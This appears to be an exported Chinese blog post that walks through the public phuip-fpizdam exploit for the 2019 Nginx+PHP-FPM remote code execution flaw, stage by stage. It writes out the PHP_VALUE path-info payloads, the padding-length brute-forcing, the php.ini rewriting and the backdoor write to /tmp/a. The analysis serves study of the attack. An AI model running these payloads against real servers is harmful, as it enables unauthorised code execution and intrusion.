-1\n随中层三次循环变化、等号个数1-256随内层循环变化\n\n数据包\n\n[![Kvqdmt.md.png](https://s2.ax1x.com/2019/11/04/Kvqdmt.md.png)](https://imgchr.com/i/Kvqdmt)\n\n[![Kvqw0P.md.png](https://s2.ax1x.com/2019/11/04/Kvqw0P.md.png)](https://imgchr.com/i/Kvqw0P)\n\n[![Kvq0Tf.md.png](https://s2.ax1x.com/2019/11/04/Kvq0Tf.md.png)](https://imgchr.com/i/Kvq0Tf)\n\n作用：\n\n分别尝试Q的个数为qslCandidates-1长度、qslCandidates-5-1、qslCandidates-10-1长度下，等号个数从1到256的请求的不同效果。\n\n找到当响应包header头存在set-cookie字段，且字段中存在PHPSESSID字符串时，对应的Q个数以及等号个数，共后续攻击利用\n\n详情：\n\n此处发包位于Detect方法中96行处\n\n[![KvqDk8.md.png](https://s2.ax1x.com/2019/11/04/KvqDk8.md.png)](https://imgchr.com/i/KvqDk8)\n\n可见存在一个三层嵌套循环\n\n外层for循环50次，中层循环3次，内层循环256次\n\n在内层循环里，即上图96行处，仍然使用RequestWithQueryStringPrefix方法发包\n\nPayload值获取于Detect方法中87行处的MakePathInfo方法中,如下图\n\n[![KvqrtS.md.png](https://s2.ax1x.com/2019/11/04/KvqrtS.md.png)](https://imgchr.com/i/KvqrtS)\n\n传入MakePathInfo方法中的值为method.PHPOptionEnable\n\n[![Kvqsfg.md.png](https://s2.ax1x.com/2019/11/04/Kvqsfg.md.png)](https://imgchr.com/i/Kvqsfg)\n\n即session.auto_start=1\n\n在MakePathInfo方法中，将传入的phpValue参数值前拼接/PHP_VALUE\\\\n，并赋值pi\n\n[![Kvq6pQ.md.png](https://s2.ax1x.com/2019/11/04/Kvq6pQ.md.png)](https://imgchr.com/i/Kvq6pQ)\n\n计算PosOffset值(固定34)与pi长度差并在pi后拼接对应长度差个数的;如下图\n\n[![Kvqclj.md.png](https://s2.ax1x.com/2019/11/04/Kvqclj.md.png)](https://imgchr.com/i/Kvqclj)\n\n最终payload即pathInfo为/PHP_VALUE\\\\nsession.auto_start=1;;;\n\nparams.QueryStringLength值与params.PisosLength值获取于Detect方法中95行处qsl与pl，如下图\n\n[![Kvqg6s.md.png](https://s2.ax1x.com/2019/11/04/Kvqg6s.md.png)](https://imgchr.com/i/Kvqg6s)\n\nqsl值为中层循环时遍历数组qslCandidates中的值，qslCandidates中的值如下图，分别为1785/1790/1795，这个列表值是由Q字符长度候选值确认阶段计算的候选Q长度值减5以及减10得来\n\n![Kvq2Xn.png](https://s2.ax1x.com/2019/11/04/Kvq2Xn.png)\n\nPl值为内层循环时遍历数组plCandidates中的值，plCandidates中的值如下图，分别为1-256\n\n[![Kvqf00.md.png](https://s2.ax1x.com/2019/11/04/Kvqf00.md.png)](https://imgchr.com/i/Kvqf00)\n\n会随着内层循环从0递增，因此最终补充的等号个数逐渐从1个随发包递增-置1-递增。\n\nparams.QueryStringLength值获取与\n\n当返回值满足如下if分支时，循环结束\n\n[![Kvq5kT.md.png](https://s2.ax1x.com/2019/11/04/Kvq5kT.md.png)](https://imgchr.com/i/Kvq5kT)\n\n跟入method.Check方法，如下图\n\n[![KvqItU.md.png](https://s2.ax1x.com/2019/11/04/KvqItU.md.png)](https://imgchr.com/i/KvqItU)\n\n当响应包header头存在set-cookie字段，且字段中存在PHPSESSID字符串，则method.Check方法返回true，循环终止。返回params值(params.PisosLength/params.QueryStringLength)共后续发包使用\n\n满足条件的数据包如下\n\n[![KvqohF.md.png](https://s2.ax1x.com/2019/11/04/KvqohF.md.png)](https://imgchr.com/i/KvqohF)\n\n当三层循环完全结束后，仍无满足条件的响应数据包，程序返回not vulnerable or other\nfailure\n\n当该过程结束后，会再次发送50个数据包，试图将session.auto_start设置回0\n\n### 修改PHP.ini阶段 \n\n发送位置：\n\n位于attack.go 33行\n\n[![Kvq7p4.md.png](https://s2.ax1x.com/2019/11/04/Kvq7p4.md.png)](https://imgchr.com/i/Kvq7p4)\n\n发包次数：\n\n不定，直到响应数据包body中存在\"/bin/which\"字符串后停止发包\n\n补位数据个数：\n\nQ个数以及等号个数由上一阶段(Q字符长度以及等号个数确认阶段)确定\n\nPayload:\n\n循环发送chain数组值\n\n数据包\n\n[![KvqH1J.md.png](https://s2.ax1x.com/2019/11/04/KvqH1J.md.png)](https://imgchr.com/i/KvqH1J)\n\n作用：\n\n修改php.ini\n\n详情：\n\nAttack方法位于main.go 103行被调用，接收上一阶段得出的params值进行payload计算\n\n[![Kvqbc9.md.png](https://s2.ax1x.com/2019/11/04/Kvqbc9.md.png)](https://imgchr.com/i/Kvqbc9)\n\n跟入Attack方法\n\n[![KvqqXR.md.png](https://s2.ax1x.com/2019/11/04/KvqqXR.md.png)](https://imgchr.com/i/KvqqXR)\n\n可见存在两大段for循环块\n\n首先看第一段for循环，该处for循环中嵌套一层循环\n\n[![KvqOn1.md.png](https://s2.ax1x.com/2019/11/04/KvqOn1.md.png)](https://imgchr.com/i/KvqOn1)\n\n从chain中取payload，并传递给SetSettingSingle发包\n\nChain值如下\n\n![KvqX0x.png](https://s2.ax1x.com/2019/11/04/KvqX0x.png)\n\nSetSettingSingle方法\n\n[![Kvqj76.md.png](https://s2.ax1x.com/2019/11/04/Kvqj76.md.png)](https://imgchr.com/i/Kvqj76)\n\nSetSettingSingle方法首先调用MakePathInfo处理payload，如上图29行，接着调用RequestWithQueryStringPrefix方法发包\n\n此时PathInfo值为\n/PHP_VALUE/nsession.auto_start=0;;;形式，其中session.auto_start=0为遍历chain中值\n\n其中Q的个数与等号个数，又上一步返回的params值来计算\n\n发包结果如下\n\n[![KvqxAK.md.png](https://s2.ax1x.com/2019/11/04/KvqxAK.md.png)](https://imgchr.com/i/KvqxAK)\n\n![KvqztO.png](https://s2.ax1x.com/2019/11/04/KvqztO.png)\n\n只有当返回body中存在successPattern值时，最外层for循环才会结束，否则一直循环发送chain中的值。如下图\n\n[![KvLShD.md.png](https://s2.ax1x.com/2019/11/04/KvLShD.md.png)](https://imgchr.com/i/KvLShD)\n\nsuccessPattern 值为\"/bin/which\"，如下图\n\n[![KvL99e.md.png](https://s2.ax1x.com/2019/11/04/KvL99e.md.png)](https://imgchr.com/i/KvL99e)\n\n最终结束时的返回包如下\n\n[![KvLC1H.md.png](https://s2.ax1x.com/2019/11/04/KvLC1H.md.png)](https://imgchr.com/i/KvLC1H)\n\n### 写入后门阶段\n\n发送位置：\n\n位于attack.go 48行\n\n[![KvLPcd.md.png](https://s2.ax1x.com/2019/11/04/KvLPcd.md.png)](https://imgchr.com/i/KvLPcd)\n\n发包次数：\n\n不定，直到响应数据包body中存在\"/bin/which\"字符串后停止发包\n\n补位数据个数：\n\nQ个数以及等号个数由Q字符长度以及等号个数确认阶段确定\n\nPayload:\n\n/\n\n数据包\n\n[![KvLijA.md.png](https://s2.ax1x.com/2019/11/04/KvLijA.md.png)](https://imgchr.com/i/KvLijA)\n\n作用：\n\n清空tmp\\\\a，并在tmp\\\\a中写入payload\n\n详情：\n\n此处发包位于Attack方法中的第二个for循环块\n\n[![KvLknI.md.png](https://s2.ax1x.com/2019/11/04/KvLknI.md.png)](https://imgchr.com/i/KvLknI)\n\n同上一个(修改PHP.ini阶段)相似，也是调用RequestWithQueryStringPrefix方法发包\n\n此时PathInfo值为”/”，\nparams值使用的是由Q字符长度以及等号个数确认阶段中得出的params值\n\n发包结果如下\n\n[![KvLABt.md.png](https://s2.ax1x.com/2019/11/04/KvLABt.md.png)](https://imgchr.com/i/KvLABt)\n\n当返回body中存在/bin/which时，发包结束","source":"_posts/Nginx-PHP-FPM RCE漏洞-EXP分析.md","raw":"---\ntitle: Nginx+PHP-FPM远程命令执行漏洞_EXP分析\ndate: 2019-11-04 16:14:49\ntags: web漏洞分析\ncategories: 技术\ncover: https://s2.ax1x.com/2019/11/04/KxEii4.md.jpg\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\nPHP 官方披露了Nginx + php-fpm 部分配置下存在的远程代码执行高危漏洞，攻击者可利用漏洞对目标网站进行远程代码执行攻击。\n\n本文只针对此次攻击所用到的EXP进行分析，并不涉及漏洞原理分析\n\n漏洞EXP下载地址\n\nhttps://github.com/neex/phuip-fpizdam\n\n<!--more-->\n\n## 流程\n\n### 两个重要的函数\n\n#### RequestWithQueryStringPrefix方法\n\nRequestWithQueryStringPrefix方法\n\n[![KxkPmT.md.png](https://s2.ax1x.com/2019/11/04/KxkPmT.md.png)](https://imgchr.com/i/KxkPmT)\n\nRequestWithQueryStringPrefix方法用来发送构造的get请求，该方法接收三个传入参数\n\npathInfo params prefix\n\n比较关键的参数是前两个，即pathInfo与params\n\n在发送数据包前，RequestWithQueryStringPrefix方法会用pathInfo与params计算与构造两部分数据\n\n1、GET 参数中补字符Q个数\n\nRequestWithQueryStringPrefix方法会计算qslPrime值用以在get请求参数中补”Q”字符，如下图\n\n[![Kxk9XV.md.png](https://s2.ax1x.com/2019/11/04/Kxk9XV.md.png)](https://imgchr.com/i/Kxk9XV)\n\nqslPrime值计算如下\n\n[![KxkQ0O.md.png](https://s2.ax1x.com/2019/11/04/KxkQ0O.md.png)](https://imgchr.com/i/KxkQ0O)\n\n可见是由params.QueryStringLength值、qslDelta值 prefix长度值计算得来\n\nparams.QueryStringLength，这个值由调用RequestWithQueryStringPrefix方法时作为第二个参数传入的params中取得\n\nprefix值由RequestWithQueryStringPrefix方法用来调用时传入\n\n[![Kvb7Lt.md.png](https://s2.ax1x.com/2019/11/04/Kvb7Lt.md.png)](https://imgchr.com/i/Kvb7Lt)\n\nqslDelta值计算如下\n\n[![KvbbeP.md.png](https://s2.ax1x.com/2019/11/04/KvbbeP.md.png)](https://imgchr.com/i/KvbbeP)\n\n其中pathInfo为值由RequestWithQueryStringPrefix方法用来调用时传入，以baseStatus探测阶段为例(见下文)：\n\n![Kvbqdf.png](https://s2.ax1x.com/2019/11/04/Kvbqdf.png)\n\npathInfo：/path\\\\ninfo.php\n\nr.u.EscapedPath()值：\n\n![KvbLo8.png](https://s2.ax1x.com/2019/11/04/KvbLo8.png)\n\nr.u.EscapedPath()：/index.php\n\nu.EscapedPath()值计算如下：\n\nu := \\*r.u\n\nu.Path = u.Path + pathInfo\n\n在此例中，u.EscapedPath() 值为/index.php/path%0Ainfo.php\n\nqslDelta 最终长度计算可化简为：len(“%0A”)-len(“\\\\n”)=2\n\n此例中，qslPrime最终值为1499，如下图\n\n[![KvbXFS.md.png](https://s2.ax1x.com/2019/11/04/KvbXFS.md.png)](https://imgchr.com/i/KvbXFS)\n\n最终在GET请求参数部分补充1499个Q\n\n![KvbjJg.png](https://s2.ax1x.com/2019/11/04/KvbjJg.png)\n\n2、Header头D-Pisos字段补充等号个数\n\n[![KvbvWQ.md.png](https://s2.ax1x.com/2019/11/04/KvbvWQ.md.png)](https://imgchr.com/i/KvbvWQ)\n\nHeader头D-Pisos字段值计算如上，其中补充等号个数为params.PisosLength的值，这个值由调用RequestWithQueryStringPrefix方法时作为第二个参数传入的params中取得\n\n最终发包如下\n\n[![Kvbxzj.md.png](https://s2.ax1x.com/2019/11/04/Kvbxzj.md.png)](https://imgchr.com/i/Kvbxzj)\n\n#### MakePathInfo方法\n\nMakePathInfo方法将传入的参数值前拼接/PHP_VALUE\\\\n，并赋值pi\n\n[![KvqSQs.md.png](https://s2.ax1x.com/2019/11/04/KvqSQs.md.png)](https://imgchr.com/i/KvqSQs)\n\n在计算PosOffset值(固定长为34)与pi长度差后，在pi字符串后拼接对应长度差个数的;\n\n如下图\n\n[![Kvq9Lq.md.png](https://s2.ax1x.com/2019/11/04/Kvq9Lq.md.png)](https://imgchr.com/i/Kvq9Lq)\n\n例如传入phpValue值为\\\\nsession.auto_start=1\n\n最终返回值为/PHP_VALUE\\\\nsession.auto_start=1;;;\n\n### baseStatus探测阶段\n\n发送位置：\n\n位于detect.go 32行\n\n[![KvqPe0.md.png](https://s2.ax1x.com/2019/11/04/KvqPe0.md.png)](https://imgchr.com/i/KvqPe0)\n\n发包次数：\n\n1次\n\n补位数据个数：\n\nQ个数1499、等号个数1\n\nPayload:\n\n/path\\\\ninfo.php\n\n数据包\n\n[![KvqiwV.md.png](https://s2.ax1x.com/2019/11/04/KvqiwV.md.png)](https://imgchr.com/i/KvqiwV)\n\n作用：通过这次发包，确定目标系统的baseStatus，如果本次发包返回状态码为200，则后续baseStatus为200\n\n详情：\n\nmain.go中82行处调用Detect\n\n[![KvqFoT.md.png](https://s2.ax1x.com/2019/11/04/KvqFoT.md.png)](https://imgchr.com/i/KvqFoT)\n\n[![KvqAFU.md.png](https://s2.ax1x.com/2019/11/04/KvqAFU.md.png)](https://imgchr.com/i/KvqAFU)\n\nDetect调用requester.Request发包\n\nrequester.Request方法如下\n\n[![KvqEYF.md.png](https://s2.ax1x.com/2019/11/04/KvqEYF.md.png)](https://imgchr.com/i/KvqEYF)\n\nrequester.Request调用RequestWithQueryStringPrefix方法发包\n\n[![KvqVW4.md.png](https://s2.ax1x.com/2019/11/04/KvqVW4.md.png)](https://imgchr.com/i/KvqVW4)\n\n通过本次发包返回的状态码，确定目标系统的baseStatus\n\n### Q字符长度候选值确认阶段\n\n发送位置：\n\n位于detect.go 47行\n\n[![KvqeSJ.md.png](https://s2.ax1x.com/2019/11/04/KvqeSJ.md.png)](https://imgchr.com/i/KvqeSJ)\n\n发包次数：\n\n91次\n\n补位数据个数：\n\nQ个数1499-1949步长5递增、等号个数1\n\nPayload:\n\n/PHP\\\\nis_the_shittiest_lang.php\n\n数据包\n\n[![Kvqml9.md.png](https://s2.ax1x.com/2019/11/04/Kvqml9.md.png)](https://imgchr.com/i/Kvqml9)\n\n作用：\n\n确认导致返回状态码异于baseStatus的Q长度加入qsl候选列表(qslCandidates)，候选列表中还有其长度减五以及减十这两个候选值\n\n详情：\n\n此处发包，位于一处for循环中\n\n其中MaxQSl、MinQSL、QSLDetectStep值如下图\n\n![KvqnyR.png](https://s2.ax1x.com/2019/11/04/KvqnyR.png)\n\n可见该循环一个可以循环91次\n\n![KvquO1.png](https://s2.ax1x.com/2019/11/04/KvquO1.png)\n\n仍然调用RequestWithQueryStringPrefix方法发包\n\n对应传入RequestWithQueryStringPrefix方法的pathInfo为BreakingPayload，params\n\n为ap\n\nBreakingPayload值如下图\n\n![KvqMex.png](https://s2.ax1x.com/2019/11/04/KvqMex.png)\n\nAp值如下图\n\n[![KvqQw6.md.png](https://s2.ax1x.com/2019/11/04/KvqQw6.md.png)](https://imgchr.com/i/KvqQw6)\n\n即对应的params.PisosLength值也就是补充等号个数为1，对应的params.QueryStringLength值为qsl，随循环递增\n\n[![KvqlTK.md.png](https://s2.ax1x.com/2019/11/04/KvqlTK.md.png)](https://imgchr.com/i/KvqlTK)\n\n当Q长度使得返回状态码异于baseStatus，将这个Q长度值保存到qslCandidates列表中\n\n### sanity check阶段 \n\n发送位置：\n\n位于detect.go 116行\n\n[![Kvq3FO.md.png](https://s2.ax1x.com/2019/11/04/Kvq3FO.md.png)](https://imgchr.com/i/Kvq3FO)\n\n发包次数：\n\n10次\n\n补位数据个数：\n\nQ个数1949、等号个数256\n\nPayload:\n\n/PHP\\\\nSOSAT\n\n数据包\n\n[![Kvq8YD.md.png](https://s2.ax1x.com/2019/11/04/Kvq8YD.md.png)](https://imgchr.com/i/Kvq8YD)\n\n作用：\n\n进行sanity check\n操作，当此处数据包返回状态码与baseStatus值相同，且header头部不存在包含PHPSESSID字符串的set-cookie字段时，通过检测，反之，程序结束\n\n详情：\n\nSanityCheck方法在Detect方法中调用,如下图\n\n[![KvqGfe.md.png](https://s2.ax1x.com/2019/11/04/KvqGfe.md.png)](https://imgchr.com/i/KvqGfe)\n\n可见此处也存在一个for循环，最多可以循环发包10次\n\n[![KvqYSH.md.png](https://s2.ax1x.com/2019/11/04/KvqYSH.md.png)](https://imgchr.com/i/KvqYSH)\n\nSanityCheck方法仍然调用RequestWithQueryStringPrefix方法，\n\n此时pathInfo为\"/PHP\\\\nSOSAT\"，params.PisosLength值为256，补256个等号\n\n循环发送10次\n\n[![Kvqtld.md.png](https://s2.ax1x.com/2019/11/04/Kvqtld.md.png)](https://imgchr.com/i/Kvqtld)\n\n检测sanity部分代码如下\n\n[![KvqN6A.md.png](https://s2.ax1x.com/2019/11/04/KvqN6A.md.png)](https://imgchr.com/i/KvqN6A)\n\n### Q字符长度以及等号个数确认阶段\n\n发送位置：\n\n位于detect.go 96行\n\n[![KvqUOI.md.png](https://s2.ax1x.com/2019/11/04/KvqUOI.md.png)](https://imgchr.com/i/KvqUOI)\n\n发包次数：\n\n最大50\\*3\\*256次，当响应包header头存在set-cookie字段，且字段中存在PHPSESSID字符串时终止发包\n\n补位数据个数：\n\nQ个数qslCandidates -1/ qslCandidates -5 -1/ qslCandidates -10 -1\n随中层三次循环变化、等号个数1-256随内层循环变化\n\n数据包\n\n[![Kvqdmt.md.png](https://s2.ax1x.com/2019/11/04/Kvqdmt.md.png)](https://imgchr.com/i/Kvqdmt)\n\n[![Kvqw0P.md.png](https://s2.ax1x.com/2019/11/04/Kvqw0P.md.png)](https://imgchr.com/i/Kvqw0P)\n\n[![Kvq0Tf.md.png](https://s2.ax1x.com/2019/11/04/Kvq0Tf.md.png)](https://imgchr.com/i/Kvq0Tf)\n\n作用：\n\n分别尝试Q的个数为qslCandidates-1长度、qslCandidates-5-1、qslCandidates-10-1长度下，等号个数从1到256的请求的不同效果。\n\n找到当响应包header头存在set-cookie字段，且字段中存在PHPSESSID字符串时，对应的Q个数以及等号个数，共后续攻击利用\n\n详情：\n\n此处发包位于Detect方法中96行处\n\n[![KvqDk8.md.png](https://s2.ax1x.com/2019/11/04/KvqDk8.md.png)](https://imgchr.com/i/KvqDk8)\n\n可见存在一个三层嵌套循环\n\n外层for循环50次，中层循环3次，内层循环256次\n\n在内层循环里，即上图96行处，仍然使用RequestWithQueryStringPrefix方法发包\n\nPayload值获取于Detect方法中87行处的MakePathInfo方法中,如下图\n\n[![KvqrtS.md.png](https://s2.ax1x.com/2019/11/04/KvqrtS.md.png)](https://imgchr.com/i/KvqrtS)\n\n传入MakePathInfo方法中的值为method.PHPOptionEnable\n\n[![Kvqsfg.md.png](https://s2.ax1x.com/2019/11/04/Kvqsfg.md.png)](https://imgchr.com/i/Kvqsfg)\n\n即session.auto_start=1\n\n在MakePathInfo方法中，将传入的phpValue参数值前拼接/PHP_VALUE\\\\n，并赋值pi\n\n[![Kvq6pQ.md.png](https://s2.ax1x.com/2019/11/04/Kvq6pQ.md.png)](https://imgchr.com/i/Kvq6pQ)\n\n计算PosOffset值(固定34)与pi长度差并在pi后拼接对应长度差个数的;如下图\n\n[![Kvqclj.md.png](https://s2.ax1x.com/2019/11/04/Kvqclj.md.png)](https://imgchr.com/i/Kvqclj)\n\n最终payload即pathInfo为/PHP_VALUE\\\\nsession.auto_start=1;;;\n\nparams.QueryStringLength值与params.PisosLength值获取于Detect方法中95行处qsl与pl，如下图\n\n[![Kvqg6s.md.png](https://s2.ax1x.com/2019/11/04/Kvqg6s.md.png)](https://imgchr.com/i/Kvqg6s)\n\nqsl值为中层循环时遍历数组qslCandidates中的值，qslCandidates中的值如下图，分别为1785/1790/1795，这个列表值是由Q字符长度候选值确认阶段计算的候选Q长度值减5以及减10得来\n\n![Kvq2Xn.png](https://s2.ax1x.com/2019/11/04/Kvq2Xn.png)\n\nPl值为内层循环时遍历数组plCandidates中的值，plCandidates中的值如下图，分别为1-256\n\n[![Kvqf00.md.png](https://s2.ax1x.com/2019/11/04/Kvqf00.md.png)](https://imgchr.com/i/Kvqf00)\n\n会随着内层循环从0递增，因此最终补充的等号个数逐渐从1个随发包递增-置1-递增。\n\nparams.QueryStringLength值获取与\n\n当返回值满足如下if分支时，循环结束\n\n[![Kvq5kT.md.png](https://s2.ax1x.com/2019/11/04/Kvq5kT.md.png)](https://imgchr.com/i/Kvq5kT)\n\n跟入method.Check方法，如下图\n\n[![KvqItU.md.png](https://s2.ax1x.com/2019/11/04/KvqItU.md.png)](https://imgchr.com/i/KvqItU)\n\n当响应包header头存在set-cookie字段，且字段中存在PHPSESSID字符串，则method.Check方法返回true，循环终止。返回params值(params.PisosLength/params.QueryStringLength)共后续发包使用\n\n满足条件的数据包如下\n\n[![KvqohF.md.png](https://s2.ax1x.com/2019/11/04/KvqohF.md.png)](https://imgchr.com/i/KvqohF)\n\n当三层循环完全结束后，仍无满足条件的响应数据包，程序返回not vulnerable or other\nfailure\n\n当该过程结束后，会再次发送50个数据包，试图将session.auto_start设置回0\n\n### 修改PHP.ini阶段 \n\n发送位置：\n\n位于attack.go 33行\n\n[![Kvq7p4.md.png](https://s2.ax1x.com/2019/11/04/Kvq7p4.md.png)](https://imgchr.com/i/Kvq7p4)\n\n发包次数：\n\n不定，直到响应数据包body中存在\"/bin/which\"字符串后停止发包\n\n补位数据个数：\n\nQ个数以及等号个数由上一阶段(Q字符长度以及等号个数确认阶段)确定\n\nPayload:\n\n循环发送chain数组值\n\n数据包\n\n[![KvqH1J.md.png](https://s2.ax1x.com/2019/11/04/KvqH1J.md.png)](https://imgchr.com/i/KvqH1J)\n\n作用：\n\n修改php.ini\n\n详情：\n\nAttack方法位于main.go 103行被调用，接收上一阶段得出的params值进行payload计算\n\n[![Kvqbc9.md.png](https://s2.ax1x.com/2019/11/04/Kvqbc9.md.png)](https://imgchr.com/i/Kvqbc9)\n\n跟入Attack方法\n\n[![KvqqXR.md.png](https://s2.ax1x.com/2019/11/04/KvqqXR.md.png)](https://imgchr.com/i/KvqqXR)\n\n可见存在两大段for循环块\n\n首先看第一段for循环，该处for循环中嵌套一层循环\n\n[![KvqOn1.md.png](https://s2.ax1x.com/2019/11/04/KvqOn1.md.png)](https://imgchr.com/i/KvqOn1)\n\n从chain中取payload，并传递给SetSettingSingle发包\n\nChain值如下\n\n![KvqX0x.png](https://s2.ax1x.com/2019/11/04/KvqX0x.png)\n\nSetSettingSingle方法\n\n[![Kvqj76.md.png](https://s2.ax1x.com/2019/11/04/Kvqj76.md.png)](https://imgchr.com/i/Kvqj76)\n\nSetSettingSingle方法首先调用MakePathInfo处理payload，如上图29行，接着调用RequestWithQueryStringPrefix方法发包\n\n此时PathInfo值为\n/PHP_VALUE/nsession.auto_start=0;;;形式，其中session.auto_start=0为遍历chain中值\n\n其中Q的个数与等号个数，又上一步返回的params值来计算\n\n发包结果如下\n\n[![KvqxAK.md.png](https://s2.ax1x.com/2019/11/04/KvqxAK.md.png)](https://imgchr.com/i/KvqxAK)\n\n![KvqztO.png](https://s2.ax1x.com/2019/11/04/KvqztO.png)\n\n只有当返回body中存在successPattern值时，最外层for循环才会结束，否则一直循环发送chain中的值。如下图\n\n[![KvLShD.md.png](https://s2.ax1x.com/2019/11/04/KvLShD.md.png)](https://imgchr.com/i/KvLShD)\n\nsuccessPattern 值为\"/bin/which\"，如下图\n\n[![KvL99e.md.png](https://s2.ax1x.com/2019/11/04/KvL99e.md.png)](https://imgchr.com/i/KvL99e)\n\n最终结束时的返回包如下\n\n[![KvLC1H.md.png](https://s2.ax1x.com/2019/11/04/KvLC1H.md.png)](https://imgchr.com/i/KvLC1H)\n\n### 写入后门阶段\n\n发送位置：\n\n位于attack.go 48行\n\n[![KvLPcd.md.png](https://s2.ax1x.com/2019/11/04/KvLPcd.md.png)](https://imgchr.com/i/KvLPcd)\n\n发包次数：\n\n不定，直到响应数据包body中存在\"/bin/which\"字符串后停止发包\n\n补位数据个数：\n\nQ个数以及等号个数由Q字符长度以及等号个数确认阶段确定\n\nPayload:\n\n/\n\n数据包\n\n[![KvLijA.md.png](https://s2.ax1x.com/2019/11/04/KvLijA.md.png)](https://imgchr.com/i/KvLijA)\n\n作用：\n\n清空tmp\\\\a，并在tmp\\\\a中写入payload\n\n详情：\n\n此处发包位于Attack方法中的第二个for循环块\n\n[![KvLknI.md.png](https://s2.ax1x.com/2019/11/04/KvLknI.md.png)](https://imgchr.com/i/KvLknI)\n\n同上一个(修改PHP.ini阶段)相似，也是调用RequestWithQueryStringPrefix方法发包\n\n此时PathInfo值为”/”，\nparams值使用的是由Q字符长度以及等号个数确认阶段中得出的params值\n\n发包结果如下\n\n[![KvLABt.md.png](https://s2.ax1x.com/2019/11/04/KvLABt.md.png)](https://imgchr.com/i/KvLABt)\n\n当返回body中存在/bin/which时，发包结束","slug":"Nginx-PHP-FPM RCE漏洞-EXP分析","published":1,"updated":"2020-10-27T09:25:29.550Z","_id":"ckgrozu8n0018wsa930gsd5lk","comments":1,"layout":"post","photos":[],"link":"","content":"<p>PHP 官方披露了Nginx + php-fpm 部分配置下存在的远程代码执行高危漏洞，攻击者可利用漏洞对目标网站进行远程代码执行攻击。</p>\n<p>本文只针对此次攻击所用到的EXP进行分析，并不涉及漏洞原理分析</p>\n<p>漏洞EXP下载地址</p>\n<p><a href=\"https://github.com/neex/phuip-fpizdam\">https://github.com/neex/phuip-fpizdam</a></p>\n<a id=\"more\"></a>\n\n<h2 id=\"流程\"><a href=\"#流程\" class=\"headerlink\" title=\"流程\"></a>流程</h2><h3 id=\"两个重要的函数\"><a href=\"#两个重要的函数\" class=\"headerlink\" title=\"两个重要的函数\"></a>两个重要的函数</h3><h4 id=\"RequestWithQueryStringPrefix方法\"><a href=\"#RequestWithQueryStringPrefix方法\" class=\"headerlink\" title=\"RequestWithQueryStringPrefix方法\"></a>RequestWithQueryStringPrefix方法</h4><p>RequestWithQueryStringPrefix方法</p>\n<p><a href=\"https://imgchr.com/i/KxkPmT\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KxkPmT.md.png\" alt=\"KxkPmT.md.png\"></a></p>\n<p>RequestWithQueryStringPrefix方法用来发送构造的get请求，该方法接收三个传入参数</p>\n<p>pathInfo params prefix</p>\n<p>比较关键的参数是前两个，即pathInfo与params</p>\n<p>在发送数据包前，RequestWithQueryStringPrefix方法会用pathInfo与params计算与构造两部分数据</p>\n<p>1、GET 参数中补字符Q个数</p>\n<p>RequestWithQueryStringPrefix方法会计算qslPrime值用以在get请求参数中补”Q”字符，如下图</p>\n<p><a href=\"https://imgchr.com/i/Kxk9XV\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/Kxk9XV.md.png\" alt=\"Kxk9XV.md.png\"></a></p>\n<p>qslPrime值计算如下</p>\n<p><a href=\"https://imgchr.com/i/KxkQ0O\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KxkQ0O.md.png\" alt=\"KxkQ0O.md.png\"></a></p>\n<p>可见是由params.QueryStringLength值、qslDelta值 prefix长度值计算得来</p>\n<p>params.QueryStringLength，这个值由调用RequestWithQueryStringPrefix方法时作为第二个参数传入的params中取得</p>\n<p>prefix值由RequestWithQueryStringPrefix方法用来调用时传入</p>\n<p><a href=\"https://imgchr.com/i/Kvb7Lt\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/Kvb7Lt.md.png\" alt=\"Kvb7Lt.md.png\"></a></p>\n<p>qslDelta值计算如下</p>\n<p><a href=\"https://imgchr.com/i/KvbbeP\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvbbeP.md.png\" alt=\"KvbbeP.md.png\"></a></p>\n<p>其中pathInfo为值由RequestWithQueryStringPrefix方法用来调用时传入，以baseStatus探测阶段为例(见下文)：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/Kvbqdf.png\" alt=\"Kvbqdf.png\"></p>\n<p>pathInfo：/path\\ninfo.php</p>\n<p>r.u.EscapedPath()值：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvbLo8.png\" alt=\"KvbLo8.png\"></p>\n<p>r.u.EscapedPath()：/index.php</p>\n<p>u.EscapedPath()值计算如下：</p>\n<p>u := *r.u</p>\n<p>u.Path = u.Path + pathInfo</p>\n<p>在此例中，u.EscapedPath() 值为/index.php/path%0Ainfo.php</p>\n<p>qslDelta 最终长度计算可化简为：len(“%0A”)-len(“\\n”)=2</p>\n<p>此例中，qslPrime最终值为1499，如下图</p>\n<p><a href=\"https://imgchr.com/i/KvbXFS\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvbXFS.md.png\" alt=\"KvbXFS.md.png\"></a></p>\n<p>最终在GET请求参数部分补充1499个Q</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvbjJg.png\" alt=\"KvbjJg.png\"></p>\n<p>2、Header头D-Pisos字段补充等号个数</p>\n<p><a href=\"https://imgchr.com/i/KvbvWQ\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvbvWQ.md.png\" alt=\"KvbvWQ.md.png\"></a></p>\n<p>Header头D-Pisos字段值计算如上，其中补充等号个数为params.PisosLength的值，这个值由调用RequestWithQueryStringPrefix方法时作为第二个参数传入的params中取得</p>\n<p>最终发包如下</p>\n<p><a href=\"https://imgchr.com/i/Kvbxzj\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/Kvbxzj.md.png\" alt=\"Kvbxzj.md.png\"></a></p>\n<h4 id=\"MakePathInfo方法\"><a href=\"#MakePathInfo方法\" class=\"headerlink\" title=\"MakePathInfo方法\"></a>MakePathInfo方法</h4><p>MakePathInfo方法将传入的参数值前拼接/PHP_VALUE\\n，并赋值pi</p>\n<p><a href=\"https://imgchr.com/i/KvqSQs\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvqSQs.md.png\" 